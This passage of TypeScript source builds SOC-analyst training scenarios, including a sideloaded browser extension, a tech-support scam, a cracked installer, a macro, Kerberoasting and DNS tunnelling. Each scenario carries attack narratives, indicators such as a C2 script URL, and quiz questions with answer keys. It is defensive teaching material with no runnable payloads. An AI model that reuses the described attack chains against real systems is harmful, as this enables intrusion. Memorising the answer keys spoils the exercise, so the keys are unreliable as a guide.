      { id: "q3", prompt: "The Falcon alert shows 'Prevention, process killed and file quarantined.' at Critical severity. Is the incident fully resolved at that point?", kind: "single",
        options: [
          { value: "yes", label: "Yes - the EDR quarantined the binary before it could execute, so the threat is neutralized and no post-execution cleanup is required" },
          { value: "no",  label: "No - the malware ran and achieved persistence before being caught; the analyst must still check for other changes and document it" },
        ],
        answer: "no", xp: 60,
        explanation: "Quarantine stops the immediate threat, but it doesn't undo everything the malware did while it was running. A SOC analyst still needs to check for any other artifacts, confirm the Registry key was actually removed, and write up the incident - 'quarantined' is the start of cleanup, not the end of the investigation." },
    ],
  };
}

// =========================================================================
// Foundation Scenario C: Sideloaded Browser Extension → PowerShell Spawned by Chrome
// Third beginner-tier scenario - infection vector is a developer-mode browser
// extension, not email or physical media. Still one host, one user, EDR (+
// one firewall event for the outbound reach-out), no lateral movement.
// =========================================================================

export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-extension-malware-2026"): ScenarioBundle {
  const { title, events, T, MIN, c2Domain, c2Ip, stagerHash, dlDomain, dlIp, zipHash } = browserExtensionMalwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "newly-registered-domain"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "domain", value: dlDomain, reputation: "malicious", tags: ["extension-lure-site"] },
    { type: "ip",     value: dlIp,     reputation: "malicious", tags: ["extension-lure-site"] },
    { type: "sha256", value: zipHash,  reputation: "malicious", tags: ["sideloaded-extension-zip"] },
    { type: "sha256", value: stagerHash, reputation: "malicious", tags: ["browser-extension-loader", "stage-2-script"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "browser_extension_malware_basic",
    briefing: "The EDR killed an encoded PowerShell process on WS-MKT-3301 (d.cohen) at 09:04, and the firewall logged an alert on an outbound connection from the same host to a newly registered domain minutes earlier. Reconstruct how a browser extension reached PowerShell.",
    narrative: "d.cohen downloaded a 'perf boost' Chrome extension as a ZIP from a lure site, a NativeMessagingHosts key was registered under HKCU, and Chrome was relaunched with a developer-mode --load-extension flag. The extension messaged its registered native-messaging host — a cmd.exe wrapper Chrome launched — which spawned an encoded PowerShell command. That command connected to a newly registered domain and wrote b.ps1 to %TEMP%. The EDR killed the PowerShell process; the download URL, the registry registration, the file hashes and the C2 domain/IP tie the chain together end to end.",
    learning_objectives: [
      "Recognize a sideloaded browser extension as a persistence mechanism (T1176.001), separate from email or removable media",
      "Understand that an extension reaches the OS through a native-messaging host — the chrome.exe → cmd.exe → powershell.exe chain, not Chrome spawning PowerShell directly",
      "Identify a browser's native-messaging host spawning a scripting interpreter as a clear parent-child anomaly (T1059.001)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe",
      "See how EDR detection can lag behind execution — the beacon already completed before the process was killed",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-6 * MIN),        phase: "Initial Access",    action: "Chrome downloads the extension ZIP from a lure site" },
      { ts: T(-4 * MIN),        phase: "Persistence",       action: "A NativeMessagingHosts key is registered under HKCU for the host manifest" },
      { ts: T(0),               phase: "Persistence",       action: "Chrome relaunched with a sideloaded extension from Downloads" },
      { ts: T(MIN + 30_000),    phase: "Execution",         action: "chrome.exe launches the extension's native-messaging host (cmd.exe wrapper)" },
      { ts: T(2 * MIN),         phase: "Execution",         action: "The native host spawns encoded PowerShell — malware runs" },
      { ts: T(2 * MIN + 30_000), phase: "Command & Control", action: "PowerShell connects to a newly registered domain; URL filtering alerts but allows it" },
      { ts: T(2 * MIN + 45_000), phase: "Command & Control", action: "PowerShell writes b.ps1 to %TEMP%" },
      { ts: T(4 * MIN),         phase: "Detection",          action: "EDR kills the PowerShell process" },
    ],
    questions: [
      { id: "q1", prompt: "What is the clearest sign that this browser extension was not installed normally?", kind: "single",
        options: [
          { value: "flag",  label: "Chrome was launched with a --load-extension flag pointing to a folder in Downloads" },
          { value: "size",  label: "The extension folder was very small compared with typical Chrome Web Store extensions" },
          { value: "dept",  label: "d.cohen works in marketing, not IT, so has no reason to install browser extensions" },
        ],
        answer: "flag", xp: 40,
        explanation: "The --load-extension command-line flag is a developer-mode mechanism for loading unpacked extensions directly from disk — it bypasses the Chrome Web Store entirely, which is the normal install path for every legitimate extension. Folder size and the user's department are not reliable indicators on their own." },
      { id: "q2", prompt: "A Chrome extension cannot start a process by itself. How did this one reach powershell.exe, and why is that chain significant?", kind: "single",
        options: [
          { value: "yes", label: "The extension messaged its registered native-messaging host — a cmd.exe wrapper Chrome launched — which then spawned PowerShell; a browser's native host launching a script interpreter is an abnormal chain worth investigating" },
          { value: "no",  label: "The extension called powershell.exe directly through a JavaScript API, which is the normal way extensions run system tasks" },
        ],
        answer: "yes", xp: 50,
        explanation: "Browser extensions are sandboxed and cannot spawn arbitrary processes; the only supported bridge to the OS is Native Messaging, where Chrome launches a host executable registered on the machine. Here that host is a cmd.exe wrapper, which then spawned encoded PowerShell. The chrome.exe → cmd.exe → powershell.exe tree, not Chrome calling PowerShell directly, is the real signal and is abnormal on a user workstation." },
      { id: "q3", prompt: "The firewall ALLOWED the connection to cdn-assets-update.xyz. Does that mean the connection was safe?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the firewall evaluated the session against its URL and threat policy and allowed it, so it passed" },
          { value: "no",  label: "No — 'allowed' just means it wasn't on a blocklist yet; a domain the firewall categorises as newly registered is itself suspicious" },
        ],
        answer: "no", xp: 50,
        explanation: "Firewalls default to allow unless a domain is already known-bad. A newly registered domain is a strong red flag on its own, since legitimate business services are almost never that young. 'Allowed by the firewall' and 'safe' are not the same thing." },
    ],
  };
}

// =========================================================================
// Foundation Scenario D: Tech-Support Scam → Unapproved Remote Access Tool
// Fourth beginner-tier scenario — the user is socially engineered over the
// phone into installing a legitimate, signed remote-access tool themselves.
// One host, one user, EDR-only telemetry, no lateral movement, no
// credential theft — the "malware" here is abuse of a trusted tool.
// =========================================================================

export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-2026"): ScenarioBundle {
  const { title, events, T, MIN, toolHash, scamSite, scamIp, relayHost, relayIp, peerId } = techSupportScamScenarioEvents();

  const iocs: IOC[] = [
    { type: "sha256", value: toolHash, reputation: "suspicious", tags: ["unapproved-remote-access-tool"] },
    { type: "domain", value: scamSite, reputation: "malicious", tags: ["tech-support-scam-page"] },
    { type: "ip",     value: scamIp,   reputation: "malicious", tags: ["tech-support-scam-page"] },
    { type: "domain", value: relayHost, reputation: "suspicious", tags: ["anydesk-relay"] },
    { type: "ip",     value: relayIp,  reputation: "suspicious", tags: ["anydesk-relay"] },
    // The caller's AnyDesk incoming ID (${peerId}) is evidence in the connection_trace row, not an IOC type the schema models.
  ];
  void peerId;

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Tech-Support Scam Operator (opportunistic, financially motivated)",
    attack_kind: "tech_support_scam_basic",
    briefing: "The EDR raised a behavioural alert for an unsanctioned remote-access tool on WS-ACC-4477 at 14:06 and terminated it. A scam page was loaded on the host earlier, and an AnyDesk relay session and a new service were logged in between. The user has not opened a ticket. Establish what ran and what the remote operator did.",
    narrative: "t.mizrahi loaded a scareware page (ms-support-alert.live), called the number on it, and was talked into downloading and running AnyDesk and granting the caller control. The AnyDesk connection_trace.txt records the incoming session ID and the operator's IP; during the live relay session cmd.exe ran systeminfo and netstat, and AnyDesk was installed as a service for unattended access. The EDR then raised a behavioural unsanctioned-RMM alert and killed the processes — the referrer URL, the relay host, the trace file and the service tie the chain together.",
    learning_objectives: [
      "Recognize that a legitimate, signed tool can still be the vehicle for an attack when used outside policy (T1219)",
      "Identify a remote-access tool spawning a command shell as an observable pivot point (T1059.003)",
      "Understand that social engineering over the phone is as real an initial-access vector as email or USB",
      "See that 'blocked' at the end does not undo whatever happened during the minutes the session was active",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-3 * MIN),         phase: "Preparation",   action: "Scam/scareware page loaded on WS-ACC-4477 (ms-support-alert.live)" },
      { ts: T(0),                phase: "Preparation",   action: "AnyDesk.exe downloaded to Downloads (referrer = the scam page)" },
      { ts: T(4 * MIN),          phase: "Initial Access", action: "t.mizrahi runs AnyDesk and grants control; relay session to an AnyDesk relay opens" },
      { ts: T(4 * MIN + 55_000), phase: "Initial Access", action: "AnyDesk trace file records the incoming session ID and the operator's IP" },
      { ts: T(4 * MIN + 90_000), phase: "Discovery",      action: "cmd.exe runs systeminfo and netstat during the live session" },
      { ts: T(5 * MIN + 40_000), phase: "Persistence",    action: "AnyDesk installed as a Windows service for unattended access" },
      { ts: T(6 * MIN),          phase: "Detection",      action: "EDR raises an unsanctioned-RMM behavioural alert and terminates the processes" },
    ],
    questions: [
      { id: "q1", prompt: "AnyDesk.exe is a legitimate, digitally signed application. Does that mean this event chain is not a security incident?", kind: "single",
        options: [
          { value: "yes", label: "Yes — AnyDesk is a signed, reputable vendor tool, so its presence on the host is an IT support matter and not a security incident at all" },
          { value: "no",  label: "No — remote-access tools are routinely abused in tech-support scams; how and why it was installed matters more than the signature" },
        ],
        answer: "no", xp: 40,
        explanation: "Attackers frequently use legitimate, signed software as their entry point specifically because it does not trigger traditional malware signatures. A signed binary is not automatically safe — it matters who installed it, why, and whether it is on the approved software list for that environment." },
      { id: "q2", prompt: "Which single detail here is the strongest indicator of a tech-support scam, as opposed to a normal IT remote session?", kind: "single",
        options: [
          { value: "cmd",  label: "AnyDesk — not the company's approved helpdesk tool — was installed with no prior history and immediately opened a live external relay session, during which the desktop ran enumeration commands" },
          { value: "size", label: "AnyDesk.exe is only about 4MB, much smaller than the enterprise remote-support client used by IT" },
          { value: "dept", label: "t.mizrahi works in accounting, a department with no approved use for remote-access tools" },
        ],
        answer: "cmd", xp: 50,
        explanation: "The company has a designated helpdesk tool for legitimate remote support. A personally-installed AnyDesk session with no prior history, an outbound connection to an AnyDesk relay, and system/network enumeration run on the desktop while that session is live together deviate sharply from the normal IT support process — that is the actual observable, not the file size or department. (AnyDesk itself has no remote-shell feature; the enumeration is the caller typing in the GUI session, so the shell's parent is explorer.exe, not AnyDesk.)" },
      { id: "q3", prompt: "The EDR shows 'action_result: blocked' with Critical severity. Is the incident fully resolved at that point?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the EDR blocked the process, which ends the remote session, so the threat is neutralized and the alert can be closed" },
          { value: "no",  label: "No — the remote session was active for several minutes before the block; the analyst must confirm what the caller did and document it" },
        ],
        answer: "no", xp: 60,
        explanation: "Killing the processes stops further access, but does not undo whatever the caller already saw or did during the active session — and the AnyDesk service installed for unattended access must be removed too. A SOC analyst still needs to review what commands were run, whether any data was viewed or copied, remove the service, and write up the incident for the user's awareness training." },
    ],
  };
}

// =========================================================================
// Foundation Scenario E: Cracked Software Installer → Scheduled Task Persistence
// Fifth beginner-tier scenario — infection vector is a trojanized installer
// from a sponsored search-ad result, distinct persistence mechanism
// (scheduled task, not registry Run key) from the USB scenario. One host,
// one user, EDR (+ one firewall event for the initial download).
// =========================================================================

export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-installer-2026"): ScenarioBundle {
  const { title, events, T, MIN, downloadDomain, downloadIp, c2Domain, c2Ip, installerHash, payloadHash } = crackedSoftwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: downloadDomain, reputation: "suspicious", tags: ["cracked-software-host"] },
    { type: "ip",     value: downloadIp,     reputation: "suspicious", tags: ["cracked-software-host"] },
    { type: "domain", value: c2Domain,       reputation: "malicious", tags: ["external-infrastructure", "payload-c2"] },
    { type: "ip",     value: c2Ip,           reputation: "malicious", tags: ["external-infrastructure", "payload-c2"] },
    { type: "sha256", value: installerHash, reputation: "malicious", tags: ["trojanized-installer"] },
    { type: "sha256", value: payloadHash,   reputation: "malicious", tags: ["dropped-payload", "scheduled-task-persistence"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "cracked_software_installer_basic",
    briefing: "The firewall alerted on an executable download to WS-ENG-2093 at 20:10, Defender quarantined a file at 20:19, and in between a scheduled task was registered and the host connected to an unfamiliar domain. The activity is well outside business hours and y.golan has reported nothing.",
    narrative: "y.golan downloaded a trojanized Office 'activator' installer late in the evening (the firewall logged the EXE download; the browser saved it with its origin URL). Running it dropped svchelper.exe into C:\\ProgramData\\OfficeTools and registered a scheduled task (OfficeLicenseRefresh) that runs as y.golan — no admin, so no /ru SYSTEM. When the task fired, svchelper.exe ran and connected to a C2 domain before Defender quarantined it; the installer hash, the dropped-payload hash and the C2 domain/IP tie the chain together, and the task is not shown as removed.",
    learning_objectives: [
      "Recognize a trojanized installer served through a sponsored search-ad as an infection vector distinct from email or USB",
      "Identify user execution of an unsigned, never-before-seen binary (T1204.002)",
      "Understand Scheduled Task persistence (T1053.005) as a common alternative to a Registry Run key",
      "See that off-hours activity and unsigned binaries from user-writable paths are both independent, stackable red flags",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access", action: "Trojanized activator EXE downloaded from fast-office-tools-download.top" },
      { ts: T(6 * MIN),          phase: "Execution",      action: "y.golan runs the installer; it drops svchelper.exe to C:\\ProgramData\\OfficeTools" },
      { ts: T(6 * MIN + 40_000), phase: "Persistence",    action: "schtasks.exe registers OfficeLicenseRefresh (runs as y.golan) every 30 minutes" },
      { ts: T(7 * MIN + 30_000), phase: "Execution",      action: "The task fires — Task Scheduler launches svchelper.exe as y.golan" },
      { ts: T(7 * MIN + 45_000), phase: "Command & Control", action: "svchelper.exe connects to its C2 domain" },
      { ts: T(9 * MIN),          phase: "Detection",      action: "EDR quarantines the payload (the task itself is not shown removed)" },
    ],
    questions: [
      { id: "q1", prompt: "What made this download suspicious even before the installer was run?", kind: "single",
        options: [
          { value: "time", label: "It was downloaded at 20:10, off-hours, from a third-party 'activator' site instead of the official vendor" },
          { value: "size", label: "The installer was larger than 15MB, well above the size of the genuine vendor download" },
          { value: "dept", label: "y.golan works in engineering, not IT, and engineers should not be installing their own software" },
        ],
        answer: "time", xp: 40,
        explanation: "Off-hours activity combined with a download source that is not the software vendor's own site (a sponsored ad leading to a third-party 'activator' download) is a meaningful combination of red flags. File size and department alone are not reliable indicators." },
      { id: "q2", prompt: "How does this scenario's persistence mechanism differ from a Registry Run key?", kind: "single",
        options: [
          { value: "task", label: "A scheduled task relaunches the payload on a recurring interval and at logon, instead of a HKCU\\...\\Run registry value" },
          { value: "none", label: "There is no real difference — a scheduled task is just a Run key stored in a different hive and cleaned up the same way" },
        ],
        answer: "task", xp: 50,
        explanation: "Scheduled Task persistence (T1053.005) and Registry Run Key persistence (T1547.001) are both common but technically distinct techniques for surviving a reboot. Recognizing both is important because defenders and EDR products check different artifacts to detect and remove each one." },
      { id: "q3", prompt: "Microsoft Defender quarantined svchelper.exe and removed the scheduled task. Is the workstation fully clean at that point without further review?", kind: "single",
        options: [
          { value: "yes", label: "Yes — quarantining svchelper.exe reverses every change the payload made on the host, so no further review is needed" },
          { value: "no",  label: "No — the payload ran for several minutes before detection, and the detection does not show the OfficeLicenseRefresh task being deleted; the analyst must confirm the task is gone and check for other changes" },
        ],
        answer: "no", xp: 60,
        explanation: "Quarantining the payload stops the immediate threat, but the detection record does not confirm the scheduled task itself was removed — a task pointing at a now-missing binary will keep firing and erroring, and the attacker could re-drop the payload. A thorough analyst confirms the OfficeLicenseRefresh task is deleted and checks for other dropped files, modified settings, or additional persistence before closing the incident." },
    ],
  };
}

// =========================================================================
// Foundation Scenario F: Malicious Office Macro → PowerShell Execution
// Sixth beginner-tier scenario — a simpler cousin of the phishing-malware
// chain: a single macro-enabled attachment leads straight to WINWORD.EXE
// spawning PowerShell. No exfiltration, just the initial execution chain.
// =========================================================================

export function buildMaliciousMacroScenario(scenarioId = "malicious-macro-2026"): ScenarioBundle {
  const { title, events, T, MIN, c2Domain, c2Ip, docmHash, invHash } = maliciousMacroScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "newly-registered-domain"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "sha256", value: docmHash, reputation: "malicious", tags: ["macro-document", "email-attachment"] },
    { type: "sha256", value: invHash,  reputation: "malicious", tags: ["second-stage-download"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "malicious_macro_basic",
    briefing: "The EDR raised a high-severity 'Suspicious PowerShell command line' alert on WS-SALES-1876 (s.peretz) at 11:28. The mail gateway logged an inbound attachment to the same user a few minutes earlier, and the firewall shows a download from the host right after the alert.",
    narrative: "s.peretz received a phishing email with a macro-enabled Word attachment disguised as an invoice review request. It was delivered clean and only convicted later by ZAP. Enabling content caused WINWORD.EXE to spawn an encoded PowerShell command that downloaded inv.exe over HTTP from a newly registered domain into %TEMP%. The EDR quarantined inv.exe before it ran, then quarantined the document itself; the decoded command, the firewall file log and the file hashes tie every step together.",
    learning_objectives: [
      "Recognize a macro-enabled Office attachment as a delivery mechanism (T1566.001)",
      "Identify an Office application spawning PowerShell as the clearest sign of macro execution (T1059.001)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe",
      "See the simplest version of the macro-to-execution chain, without any data exfiltration stage",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access",    action: "Phishing email with macro-enabled attachment delivered to s.peretz" },
      { ts: T(8 * MIN),          phase: "Execution",         action: "s.peretz enables content — WINWORD.EXE spawns encoded PowerShell" },
      { ts: T(8 * MIN + 6_000),  phase: "Detection",         action: "EDR alert: Office application launched encoded PowerShell (detect-only)" },
      { ts: T(8 * MIN + 25_000), phase: "Command & Control", action: "PowerShell downloads inv.exe over HTTP from a newly registered domain; firewall allows it" },
      { ts: T(8 * MIN + 29_000), phase: "Detection",         action: "EDR quarantines inv.exe in %TEMP% before it runs" },
      { ts: T(11 * MIN),         phase: "Detection",         action: "EDR quarantines the .docm; ZAP pulls the message from the inbox a minute later" },
    ],
    questions: [
      { id: "q1", prompt: "What is the clearest technical sign that the Word document's macro did something dangerous?", kind: "single",
        options: [
          { value: "parent", label: "WINWORD.EXE appears as the parent process of powershell.exe" },
          { value: "size",   label: "The attachment was under 50KB, small for a real business document" },
          { value: "sender", label: "The email came from an external address outside the company domain" },
        ],
        answer: "parent", xp: 40,
        explanation: "Microsoft Word never legitimately needs to launch a scripting interpreter as a child process. Whenever WINWORD.EXE (or any Office app) appears as the parent of powershell.exe or cmd.exe, that parent-child relationship is the direct evidence of macro-driven execution — file size and sender domain are supporting context, not the direct proof." },
      { id: "q2", prompt: "Compared to a phishing email with a ZIP-wrapped executable attachment, what is different about this macro-based chain?", kind: "single",
        options: [
          { value: "exec", label: "The malicious code runs inside a trusted Office process (WINWORD.EXE), not as a standalone executable" },
          { value: "none", label: "Nothing meaningful — in both cases the user ends up running a standalone malicious executable file on disk" },
        ],
        answer: "exec", xp: 50,
        explanation: "A macro executes inside the Office application itself, so the very first malicious action (spawning PowerShell) comes from a process the user and many security tools already trust, rather than a newly-launched suspicious .exe. This is why macro-based delivery remains effective even in environments that block unusual attachment types." },
      { id: "q3", prompt: "At what point was WS-SALES-1876 actually compromised?", kind: "single",
        options: [
          { value: "email",   label: "When the phishing email with the .docm landed in the inbox" },
          { value: "execute", label: "When s.peretz enabled content and the macro ran PowerShell" },
          { value: "detect",  label: "When CrowdStrike raised its detection and killed the process" },
        ],
        answer: "execute", xp: 60,
        explanation: "Compromise happens at execution, not at delivery or at detection. The email sitting unopened is not a compromise, and the detection at the end is the response catching up to an infection that already happened minutes earlier." },
    ],
  };
}

// =========================================================================
// Scenario 7: Kerberoasting → Service Account Abuse → xp_cmdshell
// =========================================================================

export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): ScenarioBundle {
  const { title, events, T, MIN, attackerIp, c2Ip } = kerberoastingScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",   value: attackerIp,          reputation: "suspicious", tags: ["workstation"] },
    { type: "ip",   value: c2Ip,                reputation: "malicious",  tags: ["external"] },
    { type: "url",  value: `http://${c2Ip}/pv.ps1`, reputation: "malicious", tags: ["script"] },
    { type: "user", value: "m.cohen@nexacorp.com", reputation: "suspicious", tags: ["user"] },
    { type: "user", value: "svc-mssql",           reputation: "suspicious", tags: ["service-account"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Internal Attacker (Compromised Developer Account)",
    attack_kind: "credential_theft_kerberoasting",
    briefing: "Microsoft Sentinel fired 'Anomalous Kerberos service ticket volume' for m.cohen on WS-DEV-4412 at 10:08, and Defender for Identity raised 'Suspected Kerberos SPN exposure' for the same account and workstation at 10:06. A related alert on srv-db01 is attached to the ticket.",
    narrative: `An attacker with a foothold in developer m.cohen's session on WS-DEV-4412 downloaded PowerView from 91.243.85.117 and used it to enumerate service principal names (SPNs) over LDAP. A second PowerShell then requested Kerberos TGS tickets for 12 service accounts in 90 seconds - all using weak RC4 encryption (0x17) - and wrote the tickets out as hashes to a file in the Temp folder. They were cracked offline with hashcat. About ten minutes after the last request, the cracked svc-mssql password was used from WS-DEV-4412 to open a remote desktop session on the database server srv-db01. From there svc-mssql listed the Finance$ share on srv-file01, and then used sqlcmd to run xp_cmdshell, which started a hidden, encoded PowerShell that connected out to 91.243.85.117.`,
    learning_objectives: [
      "Identify RC4 encryption (0x17) in Event ID 4769 as a Kerberoasting indicator",
      "Recognize abnormal TGS request volume from a single account in a short window",
      "Correlate the identity alert (SPN exposure) → TGS requests (4769) → cracked service account login (4624)",
      "Understand why service accounts logging on interactively is highly suspicious",
      "Detect xp_cmdshell as a post-exploitation code execution technique (T1059.001)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(100_000),       phase: "Execution",          action: "PowerShell on WS-DEV-4412 fetches pv.ps1 from 91.243.85.117 and runs Get-DomainUser -SPN against DC01 over LDAP (T1059.001)" },
      { ts: T(2 * MIN + 40_000), phase: "Detection",       action: "Defender for Identity: 'Security principal reconnaissance (LDAP)' - m.cohen on WS-DEV-4412, filter (servicePrincipalName=*)" },
      { ts: T(4 * MIN),       phase: "Credential Access",  action: "12 Kerberos TGS tickets requested in 90 seconds, all RC4 (0x17): SQL, IIS, Backup, SAP, Jenkins and other service accounts (T1558.003); hashes written to kh.txt" },
      { ts: T(6 * MIN),       phase: "Detection",          action: "Defender for Identity: 'Suspected Kerberos SPN exposure' - m.cohen on WS-DEV-4412, 12 target accounts" },
      { ts: T(8 * MIN),       phase: "Detection",          action: "Sentinel: 'Anomalous Kerberos service ticket volume' - 12 RC4 TGS tickets in 90 seconds" },
      { ts: T(14 * MIN + 50_000), phase: "Lateral Movement", action: "svc-mssql password cracked offline; mstsc.exe on WS-DEV-4412 opens RDP to srv-db01 and DC01 validates the NTLM credential (4776, then 4624 type 10) (T1021.001)" },
      { ts: T(16 * MIN),      phase: "Discovery",          action: "svc-mssql authenticates to srv-file01 from srv-db01 and lists the Finance$ share (T1135)" },
      { ts: T(18 * MIN),      phase: "Execution",          action: "sqlcmd runs xp_cmdshell; sqlservr.exe starts cmd.exe and a hidden, encoded PowerShell on the DB server (T1059.001)" },
      { ts: T(18 * MIN + 6_000), phase: "Command and Control", action: "srv-db01 opens outbound TCP/443 to 91.243.85.117, and twice more until 10:21 (T1071.001)" },
    ],
    questions: [
      {
        id: "kerb_q1_rc4",
        prompt: "Event evt_kerb_03_tgs_sql is a 4769 service-ticket request whose TicketEncryptionType is 0x17. Why does that single value turn a routine Kerberos event into a Kerberoasting indicator?",
        kind: "single",
        options: [
          { value: "rc4_offline_crack", label: "An RC4 ticket is encrypted with the service account's NTLM hash, so it cracks offline" },
          { value: "dc_fallback", label: "0x17 means the DC rejected the stronger AES cipher and issued a downgraded ticket instead" },
          { value: "preauth_disabled", label: "0x17 marks the target account as having Kerberos pre-authentication switched off" },
          { value: "tgt_only_value", label: "0x17 can only ever appear on a TGT request, never on a service-ticket request" },
        ],
        answer: "rc4_offline_crack",
        xp: 50,
        explanation:
          "0x17 is RC4-HMAC. The TGS is sealed with a key derived directly from the service account's NTLM hash, so anyone holding the ticket can brute-force the password offline with no further traffic to the DC - that is the whole point of Kerberoasting (T1558.003). 'dc_fallback' is wrong: the client, not the DC, proposes the encryption types, and RC4 here was requested, not forced. 'preauth_disabled' describes AS-REP roasting (T1558.004), which shows up as PreAuthType 0 on a 4768 TGT request, not as an encryption type on a 4769. 'tgt_only_value' inverts the facts - the record is event ID 4769, a TGS, and TicketEncryptionType appears on both 4768 and 4769.",
      },
      {
        id: "kerb_q2_volume",
        prompt: "Select the TWO observations that, taken together, separate this activity from normal Kerberos ticket traffic. You will need evt_kerb_02_mdi_spn_exposure and evt_kerb_06_ticket_spike, and the 4769 rows on DC01 they summarise.",
        kind: "multi",
        options: [
          { value: "spn_enum_first", label: "The identity sensor ties the requests to one account working through 12 SPN-holding service accounts" },
          { value: "twelve_in_90s", label: "Twelve service tickets for twelve distinct SPNs were issued inside a 90-second window" },
          { value: "logged_on_dc", label: "Every one of the ticket requests was recorded on DC01 rather than on the workstation" },
          { value: "ntlm_package", label: "The ticket requests name NTLM as the authentication package used against the domain" },
        ],
        answer: ["spn_enum_first", "twelve_in_90s"],
        xp: 75,
        explanation:
          "Kerberoasting has a shape: first find every account that has an SPN, then ask for a ticket for each one. Defender for Identity's 'Suspected Kerberos SPN exposure' names that shape - one source account and workstation, 12 SPN-holding target accounts - and the 4769 rows on DC01 measure it: 12 RC4 tickets for 12 distinct service accounts between 10:04:00 and 10:05:28. A single ticket request is ordinary; one user sweeping every service account is the technique. (A domain controller writes no Security event for a client's LDAP search filter, so the enumeration itself is seen through the identity sensor and the workstation's own LDAP connection, not a 4662.) 'logged_on_dc' is a property of the log source, not the behaviour: 4769 is *always* written by the KDC on a domain controller, including for m.cohen's benign baseline tickets. 'ntlm_package' is simply false here - 4769 is a Kerberos event by definition and no NTLM package is recorded on it; the NTLM authentication in this scenario appears later, on the 4776 and 4624.",
      },
      {
        id: "kerb_q3_chain",
        prompt: "evt_kerb_07_svcacct_login shows svc-mssql logging on to srv-db01 from WS-DEV-4412. Read it alongside evt_kerb_03_tgs_sql and the 4776 that DC01 wrote for svc-mssql seconds earlier. What does the set actually establish?",
        kind: "single",
        options: [
          { value: "cracked_and_reused", label: "The svc-mssql ticket was cracked offline and its recovered password used to log on" },
          { value: "ticket_replayed", label: "The captured TGS ticket was replayed straight to srv-db01 to open the interactive session" },
          { value: "service_restart", label: "The SQL Server service restarted on srv-db01 and re-authenticated its own account" },
          { value: "delegation_relay", label: "Unconstrained delegation on srv-db01 forwarded m.cohen's ticket on to the database host" },
        ],
        answer: "cracked_and_reused",
        xp: 100,
        explanation:
          "The link is the ten-minute gap plus the authentication package. The last ticket request was at 10:05:28 and the logon at 10:15:00. A TGS is Kerberos; this logon is NTLM (AuthenticationPackageName NTLM, validated by a 4776 on DC01), which means a password or its hash was typed in, not a ticket presented - so the ticket must have been cracked in between. 'ticket_replayed' fails on that same field: replaying a TGS produces a Kerberos logon, and a service ticket grants access to one service, not an interactive session. 'service_restart' fails on LogonType and origin - a service starting itself is LogonType 5 and originates on srv-db01, whereas this record is LogonType 10 and carries the developer workstation's IP. 'delegation_relay' would impersonate m.cohen, the delegating user, and would still be Kerberos; the TargetUserName here is svc-mssql.",
      },
      {
        id: "kerb_q4_dbexec",
        prompt: "Select the TWO facts that make the srv-db01 activity a confirmed compromise rather than ordinary database administration.",
        kind: "multi",
        options: [
          { value: "svc_interactive", label: "A service account opened an interactive session from a developer's workstation" },
          { value: "xp_cmdshell_enc", label: "sqlservr.exe used xp_cmdshell to launch a hidden Base64-encoded PowerShell command" },
          { value: "master_database", label: "The Guardium record shows the statement was executed against the master database" },
          { value: "osql_client", label: "The client application on the Guardium record is SQLCMD rather than a web app" },
        ],
        answer: ["svc_interactive", "xp_cmdshell_enc"],
        xp: 75,
        explanation:
          "Service accounts are meant to be used *by services* - non-interactive logon types from the servers they run on. A LogonType 10 for svc-mssql sourced from a developer workstation has no benign explanation, and xp_cmdshell spawning hidden encoded PowerShell (sqlservr.exe > cmd.exe > powershell.exe, which then connects out to 91.243.85.117) is command execution on the DB host (T1059.001), not database work. 'master_database' is a red herring: xp_cmdshell is an extended stored procedure that lives in master, so every legitimate call to it is also against master. 'osql_client' is likewise neutral - sqlcmd is a Microsoft-supplied SQL client that DBAs use daily; the tool does not make the statement malicious, the statement does.",
      },
    ],
  };
}

// =========================================================================
// Scenario 8: DNS Tunneling - C2 via DNS TXT Records + Exfiltration
// =========================================================================

export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): ScenarioBundle {
  const { title, events, T, MIN, victimIp, c2Domain, c2Ip, dnscat2Hash } = dnsTunnelingScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain,                       reputation: "malicious", tags: ["external"] },
    { type: "ip",     value: c2Ip,                           reputation: "malicious", tags: ["external"] },
    { type: "sha256", value: dnscat2Hash,                    reputation: "malicious", tags: ["file"] },
    { type: "ip",     value: victimIp,                       reputation: "suspicious", tags: ["workstation"] },
    { type: "domain", value: `data.${c2Domain}`,             reputation: "malicious", tags: ["external"] },
    { type: "user",   value: "a.jones@nexacorp.com",         reputation: "suspicious", tags: ["user"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-TUNNELRAT (Nation-State Affiliate)",
